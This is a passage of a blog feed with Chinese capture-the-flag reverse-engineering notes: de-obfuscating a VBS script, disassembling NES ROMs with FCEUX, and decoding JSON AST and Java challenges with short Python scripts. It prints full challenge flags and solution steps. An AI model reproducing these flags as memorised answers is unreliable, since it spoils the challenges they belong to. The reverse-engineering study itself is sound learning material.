    <content type="html"><![CDATA[<h1 id="vbs逆向"><a href="#vbs逆向" class="headerlink" title="vbs逆向"></a>vbs逆向</h1><h2 id="例题-XYCTF"><a href="#例题-XYCTF" class="headerlink" title="例题 XYCTF"></a>例题 XYCTF</h2><p>看了看网上的教程，发现这个文件有很多Chr加密，看了大佬的WP之后，发现有更简单的方法，就是将前面的Execute改成 wscript.echo，然后就可以直接输出脚本内容了，真的厉害，tql了</p><p><img src="/./img/JpCQ8WOaQzlTWjlh/1743745235756-4c922d96-add3-4058-b8ac-3dd12f773143-440883.png" alt="1743745235756-4c922d96-add3-4058-b8ac-3dd12f773143.png">是个rc4</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">miwen=&#x27;90df4407ee093d309098d85a42be57a2979f1e51463a31e8d15e2fac4e84ea0df622a55c4ddfb535ef3e51e8b2528b826d5347e165912e99118333151273cc3fa8b2b3b413cf2bdb1e8c9c52865efc095a8dd89b3b3cfbb200bbadbf4a6cd4&#x27;<br>key=&#x27;rc4key&#x27;<br></code></pre></td></tr></table></figure><p>miwen&#x3D;’90df4407ee093d309098d85a42be57a2979f1e51463a31e8d15e2fac4e84ea0df622a55c4ddfb535ef3e51e8b2528b826d5347e165912e99118333151273cc3fa8b2b3b413cf2bdb1e8c9c52865efc095a8dd89b3b3cfbb200bbadbf4a6cd4’</p><p>key&#x3D;’rc4key’</p><p><img src="/./img/JpCQ8WOaQzlTWjlh/1743745724775-8c9d2a51-68f1-40da-8aa7-6cf81b39de26-239135.png" alt="1743745724775-8c9d2a51-68f1-40da-8aa7-6cf81b39de26.png"></p><blockquote><p>更新: 2025-04-07 10:03:45<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/wbtfry52ppx4p6rx">https://www.yuque.com/chaye-apqbl/vsc85q/wbtfry52ppx4p6rx</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/RE/%E5%90%84%E7%A7%8D%E8%AF%AD%E8%A8%80/nes%E9%80%86%E5%90%91/"/>
    <url>/2026/01/19/RE/%E5%90%84%E7%A7%8D%E8%AF%AD%E8%A8%80/nes%E9%80%86%E5%90%91/</url>
    
    <content type="html"><![CDATA[<h1 id="nes逆向"><a href="#nes逆向" class="headerlink" title="nes逆向"></a>nes逆向</h1><p><a href="https://blog.csdn.net/fogota/article/details/6767758">https://blog.csdn.net/fogota/article/details/6767758</a></p><h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>一、如何找到Mapper&#x3D;0的NES游戏？</p><p>你自然有不少的NES文件，同时也知道上哪去下载这些文件，你可以多下载一些你觉得简单的游戏。我下面介绍查看mapper值的方法。</p><p>我已经找到几个Mapper&#x3D;0的游戏：超级玛丽、坦克大战</p><p>方法有两个</p><p>方法(1) VirtuaNES</p><p>用VirtuaNES 打开NES文件，点菜单“文件-ROM信息”就可以查看mapper值了。</p><p>方法(2) NesHeader</p><p>用网友“疾风の迅雷”写的一个软件NesHeader.exe，可以批量读取整个文件夹上所有NES文件的ROM信息。</p><p>**</p><p>找到Mapper0的NES游戏之后，我们来确定机器码的运行首地址。</p><p>Mapper0的nes只有一段机器码段，这就好办了。其首地址有可能是</p><p>   $8000  或  $C000</p><p>先不要问我为什么有两个可能性，我先来教你判断。</p><p>二、怎样判断Mapper0的NES游戏的机器码的首地址。</p><p>第一步：我提供两个办法。</p><p>先看NES文件的大小,</p><p>NES文件</p><p><img src="/./img/PDpaG7H9vVRKdf9r/1741418451147-c7014651-ee07-41a9-b57d-f2227826a2a0-199404.png" alt="1741418451147-c7014651-ee07-41a9-b57d-f2227826a2a0.png"></p><p>另一个办法：用上面提到的NesHeader.exe，查看PROM大小,</p><p><img src="/./img/PDpaG7H9vVRKdf9r/1741418463059-b44b4680-4b01-4282-a99b-9ea6a0874ca8-814322.png" alt="1741418463059-b44b4680-4b01-4282-a99b-9ea6a0874ca8.png"></p><p>第二步：如果nes大小&#x3D;24K则要查看游戏程序的运行地址区域。</p><p>用Fcdebug打开ROM，点菜单DEBUG，打开“指令显示&#x2F;控制”窗口。按“暂停”，查看（运行）地址。（这时看到的是正在运行任一条指令）</p><p><img src="/./img/PDpaG7H9vVRKdf9r/1741418480682-5e7ed3b8-7e54-481a-8da1-19dd483fcc67-200006.png" alt="1741418480682-5e7ed3b8-7e54-481a-8da1-19dd483fcc67.png"></p><p>本办法是针对Mapper0的NES而设计的，对于别的Mapper值则完全不适用。</p><p>钻牛角的人要跑来问“别的Mapper是如何找到首地址？”</p><p>我在文章的后面解答一下吧。</p><p>**</p><p>接下来要将机器码从NES文件上分离出来。</p><p>你要知道，NES文件是由文件头(Head)、程序ROM（即PROM）、图形ROM（即VROM）组成。在ROM里面，连接的顺也是Head-PROM-VROM。其中Head固定占16字节；PROM占[n x 16K]，n是一个倍数；VROM占[m x 8K]，m是一个倍数。</p><p>朋友们看出来了，这个PROM的大小和VROM的大小在ROM信息中出现过。</p><p>PROM一般是16K为1页(1 bank)，也有8K,4K为单位的。因不同的Mapper值而异。（NES文件中统统以16K为单位记录）</p><p>我们专门说Mapper0，这个号是不切页的，所以可以看成只有1页，也就是说：</p><p>注：机器码首地址，指机器码运行时在寄存器中的首地址，不是NES文件上的地址。</p><p>NES大小</p><p>PROM大小</p><p>机器码首地址</p><p>机器码末地址</p><p>机器码长度</p><p>40K</p><p><img src="/./img/PDpaG7H9vVRKdf9r/1741420979634-50c13261-8ea0-4a2a-90f8-42ae8eebea88-767356.png" alt="1741420979634-50c13261-8ea0-4a2a-90f8-42ae8eebea88.png"></p><p>在上面的述中揭示了一些东西。要是看不明白也没关系，下面可以照着做。</p><p>三、如何才能将机器码从NES文件上分离出来？</p><p>我提供两个办法。上面用到的地址，我都算准了。</p><p>方法(1)DUMP法：</p><p>用FCdebug(NES_debug)运行ROM，点菜单DEBUG，打开“指令显示&#x2F;控制”窗口。按“暂停”，在窗口的最底行，找到“内存”，在边上的两个编辑框里，填入首地址和末地址，建议末地址统一填FFFF，其中$号省略。然后按“DUMP下来”，保存成mem文件。</p><p>FCdebug是VirtuaNES的一个改版，加入了debug功能。</p><p>方法(2)HEX编辑法：</p><p>用HEX类编辑软件，打开ROM。例如Hex Workshop。</p><p><img src="/./img/PDpaG7H9vVRKdf9r/1741420994150-67b1ac62-76fd-4ae2-bf02-d7b347c5a242-630553.png" alt="1741420994150-67b1ac62-76fd-4ae2-bf02-d7b347c5a242.png"></p><p>将这个地址以下的部分（包括这个分界点）删除或剪切走。留下的部分另存为mem文件。</p><p>**</p><p>终于到了反汇编软件上场了。</p><p>有人会问：“这个mem是什么文件？”</p><p>这个是内存文件，其实就是机器码，里面没有别的东西了。这个后缀名不重要，因为都没有关联软件。你叫他bin文件或别的都行。我只为统一叫法。</p><p>四、如何将mem文件显示成汇编代码呢？</p><p>我用这个</p><p>看图标,这是我用的“反汇编器”。它可以对多种CPU进行反汇编。</p><p><img src="/./img/PDpaG7H9vVRKdf9r/1741421022907-3e6fcc2e-ca2e-4252-986c-12cb303d8471-209037.png" alt="1741421022907-3e6fcc2e-ca2e-4252-986c-12cb303d8471.png"></p><p>（1）打开它，先要选CPU，在窗口右上角选6502。</p><p>（2）用这个反汇编软件,打开mem文件。</p><p>（3）然后点选项“BIN文件”,在开始地址,填上“首地址”,</p><p>（4）确定提勾“立即反编译”，点“确定”就OK</p><p>（5）保存反汇编的asm文档,结束。</p><p>**</p><p>汇编代码是反出来了。可是问题来了：“从何看起？”</p><p>针对NES的结构，机器码是有一个入口的，这个入口的地址写在一个固定的地方。我们叫“指针”。共有3个指针，都放在一起，分别指向NMI、RESET、IRQ|BRK。其中RESET就是主程序的入口，NMI是中断的入口，IRQ|BRK是另一种中断入口。</p><p>五、如何找到程序的入口？</p><p>将asm文件（用记事本）打开，滚动条向下拉，拉到底。看到FFFA到FFFF的数据，抄下来。</p><p><img src="/./img/PDpaG7H9vVRKdf9r/1741421106794-4b2335c0-145a-470f-a4ae-039659f924eb-414856.png" alt="1741421106794-4b2335c0-145a-470f-a4ae-039659f924eb.png"></p><p>记a,b 是一组指针，实际地址为ba，即a为低位，b为高位。如此类推得3组指针</p><p>NMI &#x3D; ba</p><p>RESET &#x3D; dc</p><p>IRQ|BRK &#x3D; fe</p><p><img src="/./img/PDpaG7H9vVRKdf9r/1741421059983-d610e2cd-cb14-48ce-a625-ef24d88859d3-710283.png" alt="1741421059983-d610e2cd-cb14-48ce-a625-ef24d88859d3.png"></p><p>NMI &#x3D; $8035</p><p>RESET &#x3D; $8000</p><p>IRQ|BRK &#x3D; $805C</p><p>六、注意事项</p><p>反汇编的结果不是全都是代码，其中有部分可能会是数据，也有可能整页都是图型（CHR）数据。反汇编器总是优先将能够反成代码的译成代码。于是你会发现在DB旁边出现没有作用的代码，有时发现代码去读一个指令，其实是在读指针或数据。</p><p>另外一些软件生成的ROM会加入一些没机会运行的代码。这可能是优化不完全。</p><p>七、局部反汇编，只做第三步和第四步就行。其中第三步用dump法。具体，多接触就会了解。</p><p>疑难解答：</p><p>Mapper是什么?</p><pre><code class="hljs">Mapper是一个编号，用于区分不同电路结构的卡带。NES模拟器拿一个ROM当作是一个卡带来模拟，那么卡带的电路也要区分才能模拟的。卡带不是标准统一的，当时不同的NES游戏开发商都开发出自己独有的保密的卡带；还发展出多个不同的升级产品，可以令游戏性能更理想；同时对游戏程序有保密作用。</code></pre><p>为什么Mapper0的ROM机器码首地址有可能是$8000或$C000？</p><p>Mapper0就是表示卡带电路没有任何特别，卡带的寄存器是直接接到CPU总线上的。也就是有可能</p><p>(1)       16K的寄存器接到$8000-$BFFF的地址上并镜像到$C000-FFFF。</p><p>(2)       32K的寄存器接到$8000-$FFFF的地址上。</p><p>在(1)情况下，$8000-$BFFF和$C000-FFFF的机器码是完全一样的。主要是看程序的作者，将代码（基于）.org $8000还是.org $C000进行编译的。</p><p>我本来想在“判断首地址”的方法用程序入口的办法，但这个不准确，因为在(1)情况下我可以恶作剧的将程序入口改成对应镜像的位置，程序一样是正常运行的。</p><p>Mapper0以外的ROM是如何找到首地址？</p><p>只有Mapper0不切页，换句话说，Mapper0是静态将寄存器接入总线。其余的Mapper都是动态的将寄存器接入总线。也就是说，是通过程序控制接入某一块寄存器接入总线上某地址段，而原接入的块（页）断开。</p><p>答案就是：你要先知道最早是默认接入的寄存器页，将之按mapper0的方法反汇编。然后从程序入口，一行一行看代码，看调入了哪一页，然后计算这一页的位置，将它分离出来。再反汇编。如此直到掌握全部页的动向。</p><h1 id="FCEUX使用"><a href="#FCEUX使用" class="headerlink" title="FCEUX使用"></a>FCEUX使用</h1><h2 id="debug-ppu-viewer"><a href="#debug-ppu-viewer" class="headerlink" title="debug  ppu viewer"></a>debug  ppu viewer</h2><p>右键可以更改颜色</p><p><a href="https://fceux.com/web/help/PPUViewer.html">https://fceux.com/web/help/PPUViewer.html</a></p><p><font style="color:rgb(0, 0, 0);">介绍</font></p><p><font style="color:rgb(0, 0, 0);">NES 架构包括一个 6502 CPU 以及一个称为 PPU（图片处理单元）的自定义视频控制器。PPU 的视频内存与主 CPU 内存分开，可以通过特殊端口进行读&#x2F;写（请参阅 </font><a href="https://fceux.com/web/help/PPU.html"><font style="color:rgb(0, 0, 255);">PPU 内存</font></a><font style="color:rgb(0, 0, 0);">）。</font></p><p><font style="color:rgb(0, 0, 0);">PPU 查看器将仅显示当前 PPU 内存的内容。它不会以任何方式更改游戏数据。</font></p><p><font style="color:rgb(0, 0, 0);">使用 PPU 查看器</font></p><p><font style="color:rgb(0, 0, 0);">在扫描线上显示</font></p><p><font style="color:rgb(0, 0, 0);">此选项使其显示屏幕绘制该特定扫描线时 PPU 的外观。它对于像 SMB 这样的游戏很有用，这些游戏会在帧中交换模式表（例如，用于状态栏内容）。</font></p><p><font style="color:#DF2A3F;">右键</font><font style="color:rgb(0, 0, 0);">单击其中一个 PPU 面板将更改显示它的调色板，在图案调色板之间循环，然后是 sprite 调色板，然后是第九个固定的灰色调色板（如果所有调色板当前都是黑色的，则可用于检查 CHR）。</font></p><p><font style="color:rgb(0, 0, 0);">将鼠标光标放在图块上将显示图块地址。将光标移动到调色板颜色上将给出调色板地址。<br></font></p><p><font style="color:rgb(0, 0, 0);">当</font><font style="color:rgb(0, 0, 0);"> </font><a href="https://fceux.com/web/help/CodeDataLogger.html"><font style="color:rgb(0, 0, 255);">Code&#x2F;Data Logger</font></a><font style="color:rgb(0, 0, 0);"> </font><font style="color:rgb(0, 0, 0);">运行时，您还可以使用 “Mask unused graphics” 功能。或者，您只能遮罩已使用（绘制或以其他方式访问）的图块，并强调未使用的图块（例如，为了查找秘密 Sprite）。</font></p><p><font style="color:rgb(0, 0, 0);">注意：此功能仅适用于使用 CHR ROM 的游戏，因为代码&#x2F;数据记录器仅记录对 CHR ROM 的访问。</font></p><p><img src="/./img/PDpaG7H9vVRKdf9r/1741708767826-f8f2b419-b32e-4905-b88a-5ff17c37cf22-258209.png" alt="1741708767826-f8f2b419-b32e-4905-b88a-5ff17c37cf22.png"></p><h2 id="debug-cheat"><a href="#debug-cheat" class="headerlink" title="debug cheat"></a>debug cheat</h2><p>先看ram search  确定变量</p><p>再cheat 可以导入随机数</p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="例题xctf-chase"><a href="#例题xctf-chase" class="headerlink" title="例题xctf chase"></a>例题xctf chase</h2><p>mapper为0</p><p><img src="/./img/PDpaG7H9vVRKdf9r/1741419256964-69856734-4fc1-42ab-9929-d319c6c1fe01-503028.png" alt="1741419256964-69856734-4fc1-42ab-9929-d319c6c1fe01.png"></p><p><img src="/./img/PDpaG7H9vVRKdf9r/1741418395482-843dfd13-99ea-4389-9718-783a3594f4eb-536629.png" alt="1741418395482-843dfd13-99ea-4389-9718-783a3594f4eb.png"></p><p><img src="/./img/PDpaG7H9vVRKdf9r/1741419165702-57bad6fd-0b9c-4cac-a85f-f4fe2a9d7f28-084244.png" alt="1741419165702-57bad6fd-0b9c-4cac-a85f-f4fe2a9d7f28.png"></p><p>看到机器码从8000</p><p>ida用二进制打开 以6502的形式</p><h3 id="flag01"><a href="#flag01" class="headerlink" title="flag01"></a>flag01</h3><p><img src="/./img/PDpaG7H9vVRKdf9r/1741419767757-5cfb67c8-a43c-4092-b050-7fa0f8a78105-491218.png" alt="1741419767757-5cfb67c8-a43c-4092-b050-7fa0f8a78105.png"></p><p>可以直接ce开挂, </p><p><img src="/./img/PDpaG7H9vVRKdf9r/1741420056271-4f8d75df-b34b-48b9-8325-9b2cb0e792dc-106043.png" alt="1741420056271-4f8d75df-b34b-48b9-8325-9b2cb0e792dc.png"></p><p>TPCTF{D0_Y0U_L1KE_</p><p>也可用FCEUX自带的cheat改动<img src="/./img/PDpaG7H9vVRKdf9r/1741709266224-553180e2-fb39-44d6-a16b-2e2d6e5e2545-422997.png" alt="1741709266224-553180e2-fb39-44d6-a16b-2e2d6e5e2545.png"></p><h3 id="flag02"><a href="#flag02" class="headerlink" title="flag02"></a>flag02</h3><p>法1</p><p>经过不断调试发现AB对应的值和场景有关，每个场景对应值固定且范围普遍在0-60之间，那么尝试爆破，调整AB的值，改内存时发现会有随机性，相同的值不保证每次的闪烁结果相同，这里是尝试到0x15时看到flag2：</p><p><img src="/./img/PDpaG7H9vVRKdf9r/1741709756176-dbd26352-cb02-462d-8549-d69b24d71089-269991.png" alt="1741709756176-dbd26352-cb02-462d-8549-d69b24d71089.png"></p><p>法2</p><p><font style="color:rgb(85, 85, 85);background-color:rgb(250, 250, 250);">第二段有点misc的感觉，猜测也是在内存里面只不过不会加载到屏幕上，由于每段flag开头都会有THE FLAG PT我们搜索这几个字符的tile 34 28 25,一共发现两个其实一个是第一段flag，tile D2就是代表字符2 D1也就是字符1</font></p><p><font style="color:rgb(85, 85, 85);background-color:rgb(250, 250, 250);">这段是flag1</font></p><p><img src="/./img/PDpaG7H9vVRKdf9r/1741710181978-c9534bf4-ebe6-4cf7-8cd9-45a6069a9013-363627.png" alt="1741710181978-c9534bf4-ebe6-4cf7-8cd9-45a6069a9013.png"></p><p><img src="/./img/PDpaG7H9vVRKdf9r/1741710552358-b2720dac-228b-4429-bc6f-d7ad34761324-075770.png" alt="1741710552358-b2720dac-228b-4429-bc6f-d7ad34761324.png"></p><p>第二段是flag2</p><p><img src="/./img/PDpaG7H9vVRKdf9r/1741710162833-33cee26d-da76-4d11-87dc-0609309ade76-175952.png" alt="1741710162833-33cee26d-da76-4d11-87dc-0609309ade76.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs plain">import binascii<br><br>data = &quot;34282500262C21270030340ED200262F3200392F35002933000112A4000118302C2139D12ED93DD6202DD3333D00019ABDADAD6D000103B9ADAD6E000103B9ADAD6E0001030D01030001100001000F0F0F0F0F1C2C3C0F1222320F1424340F1132300F1C2C3C0F0927380F1121310F1132300F1121310F0727380F1323330F1132300F1525350F0527380F1323330F1132300F1929390F0B27380F1727370F1132300F1626360F0727380F1828380F0F29300F0F26300F0F24300F0F213000FF490008FF4A0000074B0008074C008000FF4D0108FF4E0100074F01080750018000FF4D0208FF4E0200074F02080750028000FF4D0308FF4E0300074F03080750038077F488F499F4AAF4B0E717F4E1E827F4ACEA37F4C8EC37F448EF37F49BF217F4280044280044280044280044204F10205010205110FF2C2536252C1A000027252D331A0000000F000000002C293625331A000304037A7B7C7D7C7D7E7F80819A9B867B8788898A8B8C8D7D807D909192939495967F94959C9500000000000058E5ADE40BE7FEE48D1C038E1D038D23038E240388B9FFFF8D2D0388B9FFFF8D2C038C2F0320FFFFA0FFD0E860000000000000&quot;<br><br>data = binascii.a2b_hex(data)<br><br>table = &#123;&#125;<br>str_1 = ord(&quot;A&quot;)<br>for i in range(0x21,0x3B):<br>    table[i] = chr(str_1)<br>    str_1 += 1<br>table[0x20] = &quot;@&quot;<br>table[0] = &quot; &quot;<br>table[0x3d] = &quot;_&quot;<br>str_1 = ord(&quot;0&quot;)<br>for i in range(0xD0,0xDA):<br>    table[i] = chr(str_1)<br>    str_1 += 1<br>flag = &quot;&quot;<br><br>for i in range(len(data)):<br>    for key,value in table.items():<br>        if data[i] == key:<br>            flag += value<br>print(flag)<br></code></pre></td></tr></table></figure><p><img src="/./img/PDpaG7H9vVRKdf9r/1741710467489-0446e5ee-e3bc-4afd-a9bc-27269875e8eb-786228.png" alt="1741710467489-0446e5ee-e3bc-4afd-a9bc-27269875e8eb.png"></p><p>THE FLAG PT2 FOR YOU IS  PLAY1N9_6@M3S_       LBRDTRPLGXAQRPAQGXCSRPEUGXCSRPIYGXGWRPFVGXHXIPFPDPAP            GWWWH H H H @@@LEVEL  GEMS       LIVES       CDMLO@0      </p><h3 id="flag03"><a href="#flag03" class="headerlink" title="flag03"></a>flag03</h3><p>看ppu viewer</p><p><img src="/./img/PDpaG7H9vVRKdf9r/1741708666856-c2b8147d-30a2-4fe3-91ba-9775a25f2426-483555.png" alt="1741708666856-c2b8147d-30a2-4fe3-91ba-9775a25f2426.png"></p><p>ON_Y0UR_N3S?}</p><p>FLAG：TPCTF{D0_Y0U_L1KE_PLAY1N9_6@M3S_ ON_Y0UR_N3S?}</p><blockquote><p>更新: 2025-03-12 00:32:25<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/fenfms5olatccy6f">https://www.yuque.com/chaye-apqbl/vsc85q/fenfms5olatccy6f</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/RE/%E5%90%84%E7%A7%8D%E8%AF%AD%E8%A8%80/json%E6%96%87%E4%BB%B6%E9%80%86%E5%90%91/"/>
    <url>/2026/01/19/RE/%E5%90%84%E7%A7%8D%E8%AF%AD%E8%A8%80/json%E6%96%87%E4%BB%B6%E9%80%86%E5%90%91/</url>
    
    <content type="html"><![CDATA[<h1 id="json文件逆向"><a href="#json文件逆向" class="headerlink" title="json文件逆向"></a>json文件逆向</h1><h1 id="入门"><a href="#入门" class="headerlink" title="入门"></a>入门</h1><h1 id="notepad-下载链接"><a href="#notepad-下载链接" class="headerlink" title="notepad++下载链接"></a>notepad++下载链接</h1><p><a href="https://notepad-plus.en.softonic.com/">https://notepad-plus.en.softonic.com/</a></p><h2 id="例题1"><a href="#例题1" class="headerlink" title="例题1"></a>例题1</h2><p>AST抽象语法树还原为js代码</p><p><strong>打开看，发现是json文件，考查的知识点是AST抽象语法树还原为js代码</strong></p><h3 id="方法一（非预期）"><a href="#方法一（非预期）" class="headerlink" title="方法一（非预期）"></a>方法一（非预期）</h3><p>这是一题json文件逆向。<br>没做过类似的题不知道怎么做，去网上搜了一下发现是可读文件。<br>意思是notepad++这种类型的文件查看器都能看到代码。<br>于是我用notepad++打开查找了一下发现可疑的字符串。</p><p><img src="/./img/49277317_xLF_VCcwmw2AwPPR/1721636294151-10a41ddd-3f6c-46fa-b784-16826421af62-481590.png" alt="1721636294151-10a41ddd-3f6c-46fa-b784-16826421af62.png"></p><p>这个肯定不是flag，试着提交了一下果然不是。<br>看到下面的value变量存的是11，我就在想会不会是异或加密。<br>于是就尝试着写个解密脚本看看能不能解的出来。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">s=&#x27;EXXH_MpjxBxYnjggrM~eerv&#x27;<br>flag=&#x27;&#x27;<br>for i in s:<br>    flag+=chr(ord(i)^11)<br>print(flag)<br></code></pre></td></tr></table></figure><p><img src="/./img/49277317_xLF_VCcwmw2AwPPR/1721636340864-eb08a725-1b93-47a8-bb25-7deb3a07a9e7-942246.png" alt="1721636340864-eb08a725-1b93-47a8-bb25-7deb3a07a9e7.png"></p><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>linux下使用 npm 包 <code>escodegen</code> 解密</p><ol><li>安装 escodegen</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">npm i escodegen -g<br></code></pre></td></tr></table></figure><p>esgenerate 1.json</p><p><img src="/./img/49277317_xLF_VCcwmw2AwPPR/1721637269193-35560b5e-9928-4a1f-bac9-b47ad9701a64-959188.png" alt="1721637269193-35560b5e-9928-4a1f-bac9-b47ad9701a64.png"></p><p>使用node,把代码输入运行拿到flag</p><p><img src="/./img/49277317_xLF_VCcwmw2AwPPR/1721637421443-9064579f-ede8-47e4-a426-cf0c425011ab-103391.png" alt="1721637421443-9064579f-ede8-47e4-a426-cf0c425011ab.png"></p><p>NSSCTF{astIsReallyFunny}</p><h1 id="json逆向进阶-与burp抓包结合"><a href="#json逆向进阶-与burp抓包结合" class="headerlink" title="json逆向进阶-与burp抓包结合"></a>json逆向进阶-与burp抓包结合</h1><p><a href="https://so.csdn.net/so/search?q=json&t=blog&u=shine4869">https://so.csdn.net/so/search?q=json&amp;t=blog&amp;u=shine4869</a></p><blockquote><p>更新: 2024-07-22 16:38:11<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/muuw3fglkgo88wvc">https://www.yuque.com/chaye-apqbl/vsc85q/muuw3fglkgo88wvc</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/RE/%E5%90%84%E7%A7%8D%E8%AF%AD%E8%A8%80/Java/"/>
    <url>/2026/01/19/RE/%E5%90%84%E7%A7%8D%E8%AF%AD%E8%A8%80/Java/</url>
    
    <content type="html"><![CDATA[<h1 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h1><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><p>放入jadx打开</p><p><img src="/./img/49277317_RrPP24DFfKd5qIpb/1722053725436-a2a0fe26-253a-4d62-89e1-57927667e014-612702.png" alt="1722053725436-a2a0fe26-253a-4d62-89e1-57927667e014.png"></p><p>exp </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">a=[180, 136, 137, 147, 191, 137, 147, 191, 148, 136, 133, 191, 134, 140, 129, 135, 191, 65]<br>for i in range(len(a)):<br>    print(chr((a[i]-ord(&#x27;@&#x27;))^32),end=&#x27;&#x27;)<br></code></pre></td></tr></table></figure><p><img src="/./img/49277317_RrPP24DFfKd5qIpb/1722053752720-5451b9b7-a405-4dd6-b65d-44bb3c137317-925112.png" alt="1722053752720-5451b9b7-a405-4dd6-b65d-44bb3c137317.png"></p><blockquote><p>更新: 2024-07-27 12:15:54<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/yyso1nhwbmxs8puq">https://www.yuque.com/chaye-apqbl/vsc85q/yyso1nhwbmxs8puq</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/RE/%E5%90%84%E7%A7%8D%E8%AF%AD%E8%A8%80/index/"/>
    <url>/2026/01/19/RE/%E5%90%84%E7%A7%8D%E8%AF%AD%E8%A8%80/index/</url>
    
    <content type="html"><![CDATA[<h1 id="各种语言"><a href="#各种语言" class="headerlink" title="各种语言"></a>各种语言</h1><blockquote><p>更新: 2024-11-13 14:46:11<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/yym5an6hf5do4g0d">https://www.yuque.com/chaye-apqbl/vsc85q/yym5an6hf5do4g0d</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/RE/%E5%85%B6%E4%BB%96/%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91/"/>
    <url>/2026/01/19/RE/%E5%85%B6%E4%BB%96/%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91/</url>
    
    <content type="html"><![CDATA[<h1 id="游戏逆向"><a href="#游戏逆向" class="headerlink" title="游戏逆向"></a>游戏逆向</h1><blockquote><p>更新: 2024-11-20 19:24:06<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/sgya9m4aexgqnygz">https://www.yuque.com/chaye-apqbl/vsc85q/sgya9m4aexgqnygz</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/RE/%E5%85%B6%E4%BB%96/%E6%95%B0%E7%8B%AC%E9%80%86%E5%90%91/"/>
    <url>/2026/01/19/RE/%E5%85%B6%E4%BB%96/%E6%95%B0%E7%8B%AC%E9%80%86%E5%90%91/</url>
    
    <content type="html"><![CDATA[<h1 id="数独逆向"><a href="#数独逆向" class="headerlink" title="数独逆向"></a>数独逆向</h1><p><a href="https://shudu.gwalker.cn/">在线数独求解器</a>(404)</p><p><a href="https://sudokusolving.bmcx.com/">https://sudokusolving.bmcx.com/</a></p><h1 id="例题littlepuzzle"><a href="#例题littlepuzzle" class="headerlink" title="例题littlepuzzle"></a>例题littlepuzzle</h1><p>看到数组</p><p>提示密码是48位，所以最后输入的是解出来的数字</p><p><img src="/./img/mYxjnF3snYk1CAAF/1729929502771-015b35cb-b440-4d97-9c8e-e390989ca09a-059355.png" alt="1729929502771-015b35cb-b440-4d97-9c8e-e390989ca09a.png"></p><p><img src="/./img/mYxjnF3snYk1CAAF/1729930463569-040282a2-15f7-4d46-b6fc-5a8b40f51f3e-301539.png" alt="1729930463569-040282a2-15f7-4d46-b6fc-5a8b40f51f3e.png"></p><p><img src="/./img/mYxjnF3snYk1CAAF/1729930476309-220d41eb-72dd-4df8-a0f7-12403b3e8aee-481179.png" alt="1729930476309-220d41eb-72dd-4df8-a0f7-12403b3e8aee.png"></p><p><img src="/./img/mYxjnF3snYk1CAAF/1729931620167-5095ccd4-75f3-4a5c-992f-78298b16882d-259570.png" alt="1729931620167-5095ccd4-75f3-4a5c-992f-78298b16882d.png"></p><p><img src="/./img/mYxjnF3snYk1CAAF/1729931574867-adf72c02-a630-4de4-9919-a7b9cf45e81a-610991.png" alt="1729931574867-adf72c02-a630-4de4-9919-a7b9cf45e81a.png"></p><blockquote><p>更新: 2025-05-28 14:46:22<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/gdfm9o4g4ergzahb">https://www.yuque.com/chaye-apqbl/vsc85q/gdfm9o4g4ergzahb</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/RE/%E5%85%B6%E4%BB%96/%E6%89%AB%E9%9B%B7%E9%80%86%E5%90%91/"/>
    <url>/2026/01/19/RE/%E5%85%B6%E4%BB%96/%E6%89%AB%E9%9B%B7%E9%80%86%E5%90%91/</url>
    
